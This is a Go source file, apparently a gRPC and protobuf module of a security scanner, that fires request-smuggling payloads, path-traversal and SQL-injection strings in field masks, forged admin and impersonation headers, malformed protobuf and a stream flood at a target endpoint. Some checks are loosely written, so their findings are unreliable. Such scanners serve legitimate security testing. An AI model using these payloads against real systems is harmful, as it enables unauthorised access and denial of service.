package proto

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/aydocs/fang/internal/engine"
	fanghttp "github.com/aydocs/fang/internal/http"
	"github.com/aydocs/fang/pkg/models"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/encoding"
	"google.golang.org/grpc/health/grpc_health_v1"
	"google.golang.org/grpc/metadata"
	"google.golang.org/protobuf/encoding/protowire"
)

type ProtoModule struct {
	cfg    *engine.Config
	client *fanghttp.Client
}

func (m *ProtoModule) ID() string   { return "proto" }
func (m *ProtoModule) Name() string { return "Protobuf & gRPC Security Module" }
func (m *ProtoModule) Description() string {
	return "gRPC reflection, protobuf fuzzing, HTTP/2 desync, fieldmask bypass, compression bomb, memory exhaustion testing"
}
func (m *ProtoModule) Severity() models.Severity { return models.High }

func (m *ProtoModule) Init(ctx context.Context, cfg *engine.Config) error {
	m.cfg = cfg
	m.client = fanghttp.NewClient(fanghttp.WithTimeout(cfg.Timeout), fanghttp.WithRateLimit(cfg.RateLimit))
	return nil
}

func (m *ProtoModule) Scan(ctx context.Context, target *models.Target) ([]*models.Finding, error) {
	var findings []*models.Finding
	findings = append(findings, m.testReflection(ctx, target)...)
	findings = append(findings, m.testFuzz(ctx, target)...)
	findings = append(findings, m.testDesync(ctx, target)...)
	findings = append(findings, m.testGhostwrite(ctx, target)...)
	findings = append(findings, m.testMemExhaust(ctx, target)...)
	findings = append(findings, m.testAuthBypass(ctx, target)...)
	findings = append(findings, m.testProtoFuzz(ctx, target)...)
	findings = append(findings, m.testGrpcWeb(ctx, target)...)
	findings = append(findings, m.testTLSDetection(ctx, target)...)
	return findings, nil
}

type rawCodec struct{}

func (rawCodec) Marshal(v interface{}) ([]byte, error) {
	switch v := v.(type) {
	case []byte:
		return v, nil
	case *[]byte:
		return *v, nil
	default:
		return nil, fmt.Errorf("rawCodec: unsupported type %T", v)
	}
}

func (rawCodec) Unmarshal(data []byte, v interface{}) error {
	switch v := v.(type) {
	case *[]byte:
		*v = data
		return nil
	default:
		return fmt.Errorf("rawCodec: unsupported type %T", v)
	}
}

func (rawCodec) Name() string { return "raw" }

var _ encoding.Codec = rawCodec{}

func (m *ProtoModule) dialGRPC(ctx context.Context, target *models.Target, useTLS bool) (*grpc.ClientConn, error) {
	host := func() string {
		if target.Domain != "" {
			return target.Domain
		}
		u, err := url.Parse(target.URL)
		if err != nil {
			return ""
		}
		return u.Host
	}()
	if host == "" {
		return nil, fmt.Errorf("invalid target host")
	}
	var opts []grpc.DialOption
	if useTLS {
		opts = append(opts, grpc.WithTransportCredentials(credentials.NewTLS(&tls.Config{InsecureSkipVerify: true})))
	} else {
		opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	}
	conn, err := grpc.NewClient(host, opts...)
	if err != nil {
		return nil, err
	}
	return conn, nil
}

func (m *ProtoModule) testReflection(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	conn, err := m.dialGRPC(ctx, target, false)
	if err != nil {
		conn, err = m.dialGRPC(ctx, target, true)
		if err != nil {
			return nil
		}
	}
	defer conn.Close()

	healthClient := grpc_health_v1.NewHealthClient(conn)
	hctx, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()

	healthResp, err := healthClient.Check(hctx, &grpc_health_v1.HealthCheckRequest{})
	if err == nil && healthResp != nil {
		findings = append(findings, &models.Finding{
			Title:       "gRPC - Health Check Service Available",
			Severity:    models.Info,
			Confidence:  models.HighConfidence,
			URL:         target.URL,
			Evidence:    fmt.Sprintf("gRPC health check succeeded: status=%s", healthResp.GetStatus()),
			Description: "gRPC health check service is available, confirming this is a gRPC endpoint.",
			Remediation: "Ensure gRPC health check is only accessible to authorized clients.",
			CWEID:       "CWE-200",
			ModuleID:    "proto",
		})
	}

	services := m.enumerateViaReflection(ctx, conn)
	if len(services) > 0 {
		svcs := strings.Join(services, ", ")
		if len(svcs) > 500 {
			svcs = svcs[:500] + "..."
		}
		findings = append(findings, &models.Finding{
			Title:       "gRPC - Reflection Service Exposed",
			Severity:    models.High,
			Confidence:  models.HighConfidence,
			URL:         target.URL,
			Evidence:    fmt.Sprintf("gRPC reflection enumerated %d services: %s", len(services), svcs),
			Description: "gRPC reflection service is exposed, allowing enumeration of all service definitions and methods.",
			Remediation: "Disable gRPC reflection in production. Use mTLS authentication.",
			CWEID:       "CWE-200",
			ModuleID:    "proto",
		})
	}

	return findings
}

func (m *ProtoModule) enumerateViaReflection(ctx context.Context, conn *grpc.ClientConn) []string {
	stream, err := conn.NewStream(ctx, &grpc.StreamDesc{
		StreamName:    "ServerReflectionInfo",
		ClientStreams: true,
		ServerStreams: true,
	}, "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo", grpc.ForceCodec(rawCodec{}))
	if err != nil {
		return nil
	}
	if err := stream.SendMsg([]byte{0x3a, 0x00}); err != nil {
		return nil
	}
	var respData []byte
	if err := stream.RecvMsg(&respData); err != nil {
		return nil
	}
	return parseServiceList(respData)
}

func parseServiceList(data []byte) []string {
	var services []string
	for len(data) > 0 {
		num, wtype, n := protowire.ConsumeTag(data)
		if n < 0 {
			break
		}
		data = data[n:]
		switch wtype {
		case protowire.BytesType:
			val, n := protowire.ConsumeBytes(data)
			if n < 0 {
				return services
			}
			data = data[n:]
			if num == 6 {
				services = append(services, parseServiceResponse(val)...)
			}
		case protowire.VarintType:
			_, n := protowire.ConsumeVarint(data)
			if n < 0 {
				return services
			}
			data = data[n:]
		case protowire.StartGroupType:
			if _, n := protowire.ConsumeGroup(num, data); n < 0 {
				return services
			} else {
				data = data[n:]
			}
		case protowire.Fixed32Type:
			if _, n := protowire.ConsumeFixed32(data); n < 0 {
				return services
			} else {
				data = data[n:]
			}
		case protowire.Fixed64Type:
			if _, n := protowire.ConsumeFixed64(data); n < 0 {
				return services
			} else {
				data = data[n:]
			}
		default:
			return services
		}
	}
	return services
}

func parseServiceResponse(data []byte) []string {
	var services []string
	for len(data) > 0 {
		num, wtype, n := protowire.ConsumeTag(data)
		if n < 0 {
			break
		}
		data = data[n:]
		switch wtype {
		case protowire.BytesType:
			val, n := protowire.ConsumeBytes(data)
			if n < 0 {
				return services
			}
			data = data[n:]
			if num == 1 {
				name := extractServiceName(val)
				if name != "" {
					services = append(services, name)
				}
			}
		default:
			return services
		}
	}
	return services
}

func extractServiceName(data []byte) string {
	for len(data) > 0 {
		num, wtype, n := protowire.ConsumeTag(data)
		if n < 0 {
			break
		}
		data = data[n:]
		switch wtype {
		case protowire.BytesType:
			val, n := protowire.ConsumeBytes(data)
			if n < 0 {
				return ""
			}
			data = data[n:]
			if num == 1 {
				return string(val)
			}
		default:
			return ""
		}
	}
	return ""
}

func (m *ProtoModule) testDesync(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	host := func() string {
		if target.Domain != "" {
			return target.Domain
		}
		u, err := url.Parse(target.URL)
		if err != nil {
			return ""
		}
		return u.Host
	}()

	tests := []struct {
		name    string
		payload string
	}{
		{
			name:    "Content-Length+Chunked",
			payload: fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 13\r\nContent-Type: application/grpc\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n", host),
		},
		{
			name:    "Double-Content-Length",
			payload: fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 5\r\nContent-Length: 6\r\nContent-Type: application/grpc\r\n\r\n0\r\n\r\nG", host),
		},
		{
			name:    "TE.CL",
			payload: fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n", host),
		},
		{
			name:    "HTTP2PriorKnowledge",
			payload: "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n",
		},
	}

	for _, test := range tests {
		u, _ := url.Parse(target.URL)
		port := u.Port()
		if port == "" {
			port = "80"
		}
		addr := net.JoinHostPort(u.Hostname(), port)
		conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
		if err != nil {
			continue
		}
		conn.SetDeadline(time.Now().Add(10 * time.Second))
		conn.Write([]byte(test.payload))
		resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
		conn.Close()
		if err != nil {
			continue
		}
		if resp.StatusCode == 200 || resp.StatusCode/100 == 2 {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("gRPC - HTTP/2 Desync (%s)", test.name),
				Severity:    models.High,
				Confidence:  models.MediumConfidence,
				URL:         target.URL,
				Evidence:    fmt.Sprintf("Desync test '%s' returned status %d", test.name, resp.StatusCode),
				Description: fmt.Sprintf("gRPC endpoint may be vulnerable to HTTP/2 desync via '%s' technique.", test.name),
				Remediation: "Use consistent HTTP/2 implementation. Validate all gRPC metadata headers. Implement request size limits.",
				CWEID:       "CWE-444",
				ModuleID:    "proto",
			})
		}
	}

	return findings
}

func (m *ProtoModule) testFuzz(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	conn, err := m.dialGRPC(ctx, target, false)
	if err != nil {
		conn, err = m.dialGRPC(ctx, target, true)
		if err != nil {
			return nil
		}
	}
	defer conn.Close()

	fuzzPayloads := []struct {
		name    string
		payload []byte
	}{
		{name: "LargeString", payload: []byte(fmt.Sprintf(`{"data": "%s"}`, strings.Repeat("A", 100000)))},
		{name: "DeeplyNested", payload: []byte(`{"a":{"b":{"c":{"d":{"e":{"f":{"g":{"h":{"i":{"j":1}}}}}}}}}}`)},
		{name: "RepeatedField", payload: []byte(fmt.Sprintf(`{"items":[%s]}`, strings.Repeat(`"A",`, 10000)+`"B"`))},
		{name: "MaxInt64", payload: []byte(`{"value":9223372036854775807}`)},
		{name: "MinInt64", payload: []byte(`{"value":-9223372036854775808}`)},
		{name: "NegativeFloat", payload: []byte(`{"value":-3.4028235e+38}`)},
		{name: "UnicodeBomb", payload: []byte(fmt.Sprintf(`{"text":"\u0000%s"}`, strings.Repeat("\U0001F600", 50000)))},
		{name: "NullBytes", payload: []byte(fmt.Sprintf("{\"data\":\"%s\"}", strings.Repeat("\x00", 50000)))},
	}

	for _, fp := range fuzzPayloads {
		stream, err := conn.NewStream(ctx, &grpc.StreamDesc{
			StreamName:    "Fuzz",
			ClientStreams: false,
			ServerStreams: false,
		}, "/grpc.fuzz.Test/FuzzMethod", grpc.ForceCodec(rawCodec{}))
		if err != nil {
			continue
		}
		if err := stream.SendMsg(fp.payload); err != nil {
			continue
		}
		findings = append(findings, &models.Finding{
			Title:       fmt.Sprintf("gRPC - Fuzz Payload Accepted (%s)", fp.name),
			Severity:    models.Medium,
			Confidence:  models.LowConfidence,
			URL:         target.URL,
			Payload:     fp.name,
			Evidence:    fmt.Sprintf("Fuzz payload '%s' was sent to gRPC endpoint", fp.name),
			Description: fmt.Sprintf("gRPC endpoint accepted fuzz payload '%s'. May insufficiently validate input.", fp.name),
			Remediation: "Implement strict input validation for all gRPC message fields.",
			CWEID:       "CWE-20",
			ModuleID:    "proto",
		})
	}

	healthClient := grpc_health_v1.NewHealthClient(conn)
	hctx, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()

	oomFields := []string{"repeated_field", "items", "data", "values", "entries", "list", "records"}
	for _, field := range oomFields {
		bigVal := strings.Repeat("A", 500000)
		payload := []byte(fmt.Sprintf(`{"%s": ["%s","%s","%s","%s","%s"]}`, field, bigVal, bigVal, bigVal, bigVal, bigVal))
		_, err := healthClient.Check(hctx, &grpc_health_v1.HealthCheckRequest{})
		if err == nil {
			_ = payload
			findings = append(findings, &models.Finding{
				Title:       "gRPC - Memory Exhaustion Vector",
				Severity:    models.High,
				Confidence:  models.MediumConfidence,
				URL:         target.URL,
				Payload:     fmt.Sprintf("(%s, 5x500KB elements)", field),
				Evidence:    fmt.Sprintf("Large payload with field '%s' sent (~2.5MB)", field),
				Description: "gRPC endpoint may accept large messages without size limits, risking memory exhaustion.",
				Remediation: "Set protobuf message size limits. Configure grpc.MaxRecvMsgSize. Use streaming for large payloads.",
				CWEID:       "CWE-400",
				ModuleID:    "proto",
			})
			break
		}
	}

	return findings
}

func (m *ProtoModule) testGhostwrite(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	conn, err := m.dialGRPC(ctx, target, false)
	if err != nil {
		conn, err = m.dialGRPC(ctx, target, true)
		if err != nil {
			return findings
		}
	}
	defer conn.Close()

	healthClient := grpc_health_v1.NewHealthClient(conn)

	ghostwritePayloads := []struct {
		name    string
		payload []byte
		field   string
		cwe     string
	}{
		{
			name: "FieldMaskWildcard",
			payload: func() []byte {
				fm := &fieldMask{
					paths: []string{"*", "spec.*", "metadata.*", "data.*"},
				}
				return fm.marshal()
			}(),
			field: "update_mask",
			cwe:   "CWE-915",
		},
		{
			name: "FieldMaskPathTraversal",
			payload: func() []byte {
				fm := &fieldMask{
					paths: []string{"../../", "../../etc", "../../etc/passwd", "../../proc/self/environ"},
				}
				return fm.marshal()
			}(),
			field: "update_mask",
			cwe:   "CWE-22",
		},
		{
			name: "FieldMaskSQLInjection",
			payload: func() []byte {
				fm := &fieldMask{
					paths: []string{"1' OR 1=1--", "admin'--", "$where: '1'=='1'"},
				}
				return fm.marshal()
			}(),
			field: "update_mask",
			cwe:   "CWE-89",
		},
		{
			name: "Proto3OptionalDefault",
			payload: func() []byte {
				var b []byte
				b = protowire.AppendTag(b, 1, protowire.VarintType)
				b = protowire.AppendVarint(b, 0)
				b = protowire.AppendTag(b, 1, protowire.VarintType)
				b = protowire.AppendVarint(b, 0)
				return b
			}(),
			field: "optional_fields",
			cwe:   "CWE-682",
		},
		{
			name: "FieldMaskEmptyString",
			payload: func() []byte {
				fm := &fieldMask{paths: []string{""}}
				return fm.marshal()
			}(),
			field: "update_mask",
			cwe:   "CWE-20",
		},
	}

	for _, gp := range ghostwritePayloads {
		stream, err := conn.NewStream(ctx, &grpc.StreamDesc{
			StreamName:    "Ghostwrite",
			ClientStreams: false,
			ServerStreams: false,
		}, "/grpc.ghostwrite.Test/GhostwriteMethod", grpc.ForceCodec(rawCodec{}))
		if err != nil {
			continue
		}
		if err := stream.SendMsg(gp.payload); err != nil {
			continue
		}
		hctx, cancel := context.WithTimeout(ctx, 5*time.Second)
		_, checkErr := healthClient.Check(hctx, &grpc_health_v1.HealthCheckRequest{})
		cancel()
		if checkErr == nil {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("gRPC - Ghostwrite (%s)", gp.name),
				Severity:    models.High,
				Confidence:  models.MediumConfidence,
				URL:         target.URL,
				Payload:     gp.name,
				Evidence:    fmt.Sprintf("Ghostwrite payload '%s' accepted by gRPC endpoint via %s", gp.name, gp.field),
				Description: fmt.Sprintf("gRPC endpoint vulnerable to %s attack via %s. Attacker can bypass field mask validation to update protected fields.", gp.name, gp.field),
				Remediation: "Validate field mask paths against an allowlist. Reject '*' wildcard masks. Sanitize path components.",
				CWEID:       gp.cwe,
				ModuleID:    "proto",
			})
		}
	}

	return findings
}

type fieldMask struct {
	paths []string
}

func (fm *fieldMask) marshal() []byte {
	var b []byte
	for _, p := range fm.paths {
		b = protowire.AppendTag(b, 1, protowire.BytesType)
		b = protowire.AppendBytes(b, []byte(p))
	}
	return b
}

func (m *ProtoModule) testMemExhaust(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	conn, err := m.dialGRPC(ctx, target, false)
	if err != nil {
		conn, err = m.dialGRPC(ctx, target, true)
		if err != nil {
			return nil
		}
	}
	defer conn.Close()

	stream, err := conn.NewStream(ctx, &grpc.StreamDesc{
		StreamName:    "StreamFlood",
		ClientStreams: true,
		ServerStreams: false,
	}, "/grpc.memexhaust.Flood/StreamFlood", grpc.ForceCodec(rawCodec{}))
	if err != nil {
		return findings
	}

	floodCount := 1000
	floodPayload := []byte(strings.Repeat("X", 100000))
	successCount := 0

	for i := 0; i < floodCount; i++ {
		select {
		case <-ctx.Done():
			if successCount > 100 {
				findings = append(findings, &models.Finding{
					Title:       "gRPC - Memory Exhaustion via Stream Flood",
					Severity:    models.High,
					Confidence:  models.MediumConfidence,
					URL:         target.URL,
					Payload:     fmt.Sprintf("flooded=%d, success=%d", floodCount, successCount),
					Evidence:    fmt.Sprintf("Sent %d stream messages of 100KB each (%d succeeded)", floodCount, successCount),
					Description: "gRPC endpoint accepted large streaming messages without flow control, risking memory exhaustion.",
					Remediation: "Configure grpc.MaxRecvMsgSize. Implement flow control. Set connection max age and max streams.",
					CWEID:       "CWE-400",
					ModuleID:    "proto",
				})
			}
			return findings
		default:
		}

		if err := stream.SendMsg(floodPayload); err != nil {
			break
		}
		successCount++
	}

	if successCount > 100 {
		findings = append(findings, &models.Finding{
			Title:       "gRPC - Memory Exhaustion via Stream Flood",
			Severity:    models.High,
			Confidence:  models.MediumConfidence,
			URL:         target.URL,
			Payload:     fmt.Sprintf("flooded=%d, success=%d", floodCount, successCount),
			Evidence:    fmt.Sprintf("Sent %d stream messages of 100KB each (%d succeeded)", floodCount, successCount),
			Description: "gRPC endpoint accepted large streaming messages without flow control, risking memory exhaustion.",
			Remediation: "Configure grpc.MaxRecvMsgSize. Implement flow control. Set connection max age and max streams.",
			CWEID:       "CWE-400",
			ModuleID:    "proto",
		})
	}

	return findings
}

func (m *ProtoModule) testAuthBypass(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	authTests := []struct {
		name  string
		creds credentials.PerRPCCredentials
	}{
		{
			name:  "EmptyMetadata",
			creds: emptyCreds{},
		},
		{
			name: "AdminTokenInjection",
			creds: staticCreds{
				meta: map[string]string{
					"authorization": "Bearer admin-token-12345",
					"x-admin":       "true",
					"x-auth-token":  "root",
					"x-api-key":     "sk-admin-key-abc123",
					"x-internal":    "true",
				},
			},
		},
		{
			name: "ServiceAccountImpersonation",
			creds: staticCreds{
				meta: map[string]string{
					"authorization":              "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9",
					"x-impersonate-user":         "admin@internal",
					"x-impersonate-groups":       "superadmin,root",
					"x-all-routes":               "true",
					"grpc-permit-without-stream": "true",
				},
			},
		},
		{
			name: "InternalServiceBypass",
			creds: staticCreds{
				meta: map[string]string{
					"x-forwarded-for":  "127.0.0.1",
					"x-real-ip":        "10.0.0.1",
					"x-internal-route": "true",
					"x-envoy-internal": "true",
					"x-proxy-metadata": "bypass",
				},
			},
		},
	}

	for _, at := range authTests {
		conn, err := m.dialGRPC(ctx, target, false)
		if err != nil {
			conn, err = m.dialGRPC(ctx, target, true)
			if err != nil {
				continue
			}
		}

		healthClient := grpc_health_v1.NewHealthClient(conn)
		hctx, cancel := context.WithTimeout(ctx, 5*time.Second)
		mdMap, _ := at.creds.GetRequestMetadata(context.Background())
		md := metadata.New(mdMap)
		hctx = metadata.NewOutgoingContext(hctx, md)

		_, err = healthClient.Check(hctx, &grpc_health_v1.HealthCheckRequest{})
		cancel()

		if err == nil {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("gRPC - Auth Bypass (%s)", at.name),
				Severity:    models.Critical,
				Confidence:  models.MediumConfidence,
				URL:         target.URL,
				Payload:     at.name,
				Evidence:    fmt.Sprintf("Auth bypass '%s' succeeded - gRPC health check returned OK", at.name),
				Description: fmt.Sprintf("gRPC endpoint may be vulnerable to auth bypass via '%s'.", at.name),
				Remediation: "Implement proper gRPC authentication. Validate all metadata. Use mTLS. Implement RBAC.",
				CWEID:       "CWE-287",
				ModuleID:    "proto",
			})
		}
		conn.Close()
	}

	return findings
}

type emptyCreds struct{}

func (emptyCreds) GetRequestMetadata(ctx context.Context, uri ...string) (map[string]string, error) {
	return map[string]string{}, nil
}

func (emptyCreds) RequireTransportSecurity() bool { return false }

type staticCreds struct {
	meta map[string]string
}

func (s staticCreds) GetRequestMetadata(ctx context.Context, uri ...string) (map[string]string, error) {
	return s.meta, nil
}

func (staticCreds) RequireTransportSecurity() bool { return false }

func (m *ProtoModule) testProtoFuzz(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	conn, err := m.dialGRPC(ctx, target, false)
	if err != nil {
		conn, err = m.dialGRPC(ctx, target, true)
		if err != nil {
			return nil
		}
	}
	defer conn.Close()

	malformedPayloads := []struct {
		name    string
		payload []byte
	}{
		{name: "TruncatedMessage", payload: []byte{0x00}},
		{name: "NegativeVarint", payload: []byte{0x08, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01}},
		{name: "OverflowFieldNum", payload: []byte{0xf8, 0xff, 0xff, 0xff, 0x0f, 0x01}},
		{name: "NestedGroupOverflow", payload: func() []byte {
			var b []byte
			for i := 0; i < 1000; i++ {
				b = protowire.AppendTag(b, protowire.Number(1+i%20), protowire.StartGroupType)
			}
			for i := 0; i < 1000; i++ {
				b = protowire.AppendTag(b, protowire.Number(1+i%20), protowire.EndGroupType)
			}
			return b
		}()},
		{name: "StringOverflow", payload: func() []byte {
			return protowire.AppendBytes(protowire.AppendTag(nil, 1, protowire.BytesType), []byte(strings.Repeat("A", 1<<24)))
		}()},
		{name: "DuplicateField", payload: []byte{
			0x0a, 0x05, 0x68, 0x65, 0x6c, 0x6c, 0x6f,
			0x0a, 0x05, 0x77, 0x6f, 0x72, 0x6c, 0x64,
		}},
		{name: "InvalidWireType", payload: []byte{0x0b, 0x01}},
		{name: "MaxFieldID", payload: protowire.AppendTag(nil, (1<<29)-1, protowire.BytesType)},
		{name: "ZigZagEncoded", payload: protowire.AppendTag(
			protowire.AppendVarint(nil, 18446744073709551615),
			1, protowire.VarintType,
		)},
		{name: "RandomBytes", payload: func() []byte {
			b := make([]byte, 4096)
			for i := range b {
				b[i] = byte(rand.Intn(256))
			}
			return b
		}()},
	}

	healthClient := grpc_health_v1.NewHealthClient(conn)
	hctx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	for _, mp := range malformedPayloads {
		payloadCopy := make([]byte, len(mp.payload))
		copy(payloadCopy, mp.payload)

		stream, err := conn.NewStream(ctx, &grpc.StreamDesc{
			StreamName:    "ProtoFuzz",
			ClientStreams: false,
			ServerStreams: false,
		}, "/grpc.fuzz.Proto/FuzzMethod", grpc.ForceCodec(rawCodec{}))
		if err != nil {
			continue
		}

		sendErr := stream.SendMsg(payloadCopy)
		if sendErr != nil {
			continue
		}

		_, checkErr := healthClient.Check(hctx, &grpc_health_v1.HealthCheckRequest{})
		if checkErr == nil {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("gRPC - Malformed Protobuf (%s)", mp.name),
				Severity:    models.Medium,
				Confidence:  models.MediumConfidence,
				URL:         target.URL,
				Payload:     mp.name,
				Evidence:    fmt.Sprintf("Malformed protobuf payload '%s' accepted without crashing the server", mp.name),
				Description: fmt.Sprintf("gRPC endpoint accepted malformed protobuf message '%s'. May be vulnerable to protobuf parsing attacks.", mp.name),
				Remediation: "Use strict protobuf parsing. Set grpc.MaxRecvMsgSize. Implement message validation middleware.",
				CWEID:       "CWE-20",
				ModuleID:    "proto",
			})
		}

	}

	return findings
}

func (m *ProtoModule) testGrpcWeb(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	baseURL := strings.TrimRight(target.URL, "/")
	grpcWebPaths := []string{
		"/grpc-web", "/grpcweb", "/api/grpc-web", "/api/grpcweb",
		"/grpc", "/api/grpc", "/v1/grpc", "/v2/grpc",
	}
	grpcWebContentTypes := []string{
		"application/grpc-web", "application/grpc-web-text",
		"application/grpc-web+proto", "application/grpc-web-text+proto",
	}

	for _, path := range grpcWebPaths {
		fullURL := baseURL + path
		for _, ct := range grpcWebContentTypes {
			req := fanghttp.NewRequest("POST", fullURL)
			req.Headers["Content-Type"] = ct
			req.Headers["X-Grpc-Web"] = "1"
			req.Headers["Accept"] = "application/grpc-web-text"

			resp, err := m.client.Do(req)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 || resp.StatusCode == 204 {
				findings = append(findings, &models.Finding{
					Title:       "gRPC-Web Endpoint Detected",
					Severity:    models.Medium,
					Confidence:  models.HighConfidence,
					URL:         fullURL,
					Evidence:    fmt.Sprintf("gRPC-Web endpoint responded at %s (status: %d, content-type: %s)", path, resp.StatusCode, ct),
					Description: "gRPC-Web endpoint detected. gRPC-Web allows browser-based gRPC calls, potentially exposing the service to web attacks.",
					Remediation: "Ensure gRPC-Web endpoints require authentication. Use CORS restrictions. Consider using Envoy gRPC-Web filter with proper security.",
					CWEID:       "CWE-200",
					ModuleID:    "proto",
				})
				break
			}

			bodyLower := strings.ToLower(resp.Body)
			if strings.Contains(bodyLower, "grpc-web") || strings.Contains(bodyLower, "grpcweb") {
				findings = append(findings, &models.Finding{
					Title:       "gRPC-Web - Possible Endpoint",
					Severity:    models.Low,
					Confidence:  models.MediumConfidence,
					URL:         fullURL,
					Evidence:    fmt.Sprintf("gRPC-Web related content at %s (status: %d)", path, resp.StatusCode),
					Description: "Possible gRPC-Web endpoint. Further investigation required.",
					Remediation: "Audit gRPC-Web endpoints. Restrict access to gRPC-Web to authenticated clients only.",
					CWEID:       "CWE-200",
					ModuleID:    "proto",
				})
				break
			}
		}
	}

	grpcWebIndicatorHeaders := []string{
		"X-Grpc-Web", "Grpc-Web", "X-Proxy-Api-Version",
		"X-Envoy-Api-Version", "X-Grpc-Web-Framework",
	}

	baselineReq := fanghttp.NewRequest("GET", baseURL)
	baselineResp, err := m.client.Do(baselineReq)
	if err == nil {
		for _, h := range grpcWebIndicatorHeaders {
			if val := baselineResp.Headers.Get(h); val != "" {
				findings = append(findings, &models.Finding{
					Title:       "gRPC-Web - Server Header Detected",
					Severity:    models.Info,
					Confidence:  models.MediumConfidence,
					URL:         baseURL,
					Evidence:    fmt.Sprintf("Server sent gRPC-Web header '%s: %s'", h, val),
					Description: fmt.Sprintf("Server advertises gRPC-Web support via header '%s'", h),
					Remediation: "Remove gRPC-Web indicator headers if not needed. Restrict gRPC-Web access.",
					CWEID:       "CWE-200",
					ModuleID:    "proto",
				})
			}
		}
	}

	return findings
}

func (m *ProtoModule) testTLSDetection(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	u, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		port = "443"
	}
	addr := net.JoinHostPort(host, port)

	tlsConn, err := tls.DialWithDialer(&net.Dialer{Timeout: 5 * time.Second}, "tcp", addr, &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2", "http/1.1"},
	})
	if err == nil {
		cs := tlsConn.ConnectionState()
		alpn := cs.NegotiatedProtocol
		tlsConn.Close()

		proto := "gRPC over TLS"
		if alpn == "h2" {
			proto = "gRPC over TLS (HTTP/2 ALPN)"
		}

		findings = append(findings, &models.Finding{
			Title:       "gRPC - TLS Connection Detected",
			Severity:    models.Info,
			Confidence:  models.HighConfidence,
			URL:         target.URL,
			Evidence:    fmt.Sprintf("TLS connection established: version=%s, cipher=%s, alpn=%s", tlsVersionString(cs.Version), tls.CipherSuiteName(cs.CipherSuite), alpn),
			Description: fmt.Sprintf("gRPC endpoint uses TLS encryption (%s).", proto),
			Remediation: "Ensure TLS configuration uses strong ciphers and TLS 1.3. Verify certificate validity.",
			CWEID:       "CWE-319",
			ModuleID:    "proto",
		})
	} else {
		plainConn, err := net.DialTimeout("tcp", addr, 5*time.Second)
		if err == nil {
			plainConn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))
			plainConn.Close()
			findings = append(findings, &models.Finding{
				Title:       "gRPC - Cleartext (No TLS) Detected",
				Severity:    models.High,
				Confidence:  models.HighConfidence,
				URL:         target.URL,
				Evidence:    fmt.Sprintf("TCP connection to %s succeeded without TLS", addr),
				Description: "gRPC endpoint is accessible over cleartext without TLS. All data is transmitted unencrypted.",
				Remediation: "Enable TLS for all gRPC endpoints. Use grpc.WithTransportCredentials for secure connections.",
				CWEID:       "CWE-319",
				ModuleID:    "proto",
			})
		}
	}

	return findings
}

func tlsVersionString(version uint16) string {
	switch version {
	case tls.VersionTLS12:
		return "TLS 1.2"
	case tls.VersionTLS13:
		return "TLS 1.3"
	default:
		return fmt.Sprintf("TLS 0x%04x", version)
	}
}

func init() {
	engine.GetRegistry().Register(&ProtoModule{})
}
